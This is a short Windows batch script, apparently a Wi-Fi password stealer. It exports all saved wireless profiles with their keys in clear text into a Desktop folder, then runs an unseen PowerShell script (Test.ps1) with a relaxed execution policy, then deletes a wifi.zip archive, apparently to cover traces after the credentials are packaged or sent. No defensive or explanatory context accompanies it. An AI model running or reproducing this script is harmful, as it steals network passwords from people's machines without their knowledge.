cd Desktop
mkdir wifi
cd wifi
netsh wlan export profile key=clear 
cd ..
Powershell.exe -executionpolicy remotesigned -File Test.ps1
del wifi.zip
